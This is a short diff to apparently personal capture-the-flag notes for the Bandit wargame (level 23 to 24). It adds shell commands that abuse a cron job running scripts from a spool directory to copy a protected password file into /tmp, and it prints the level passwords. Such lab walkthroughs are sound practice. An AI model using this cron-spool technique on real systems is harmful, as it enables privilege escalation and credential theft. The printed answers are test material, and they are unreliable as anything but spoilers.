@@ -112,4 +112,15 @@ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/bandit24_cron; chmod 777 !$
+cd /tmp/bandit24_cron; nano get.sh
+  #!/bin/bash
+  cat /etc/bandit_pass/bandit24 > /tmp/bandit24_cron/pass
+chmod 777 get.sh; cp get.sh /var/spool/bandit24/get.sh
+# wait a minute
+cat pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
+(bandit 24 to 25)
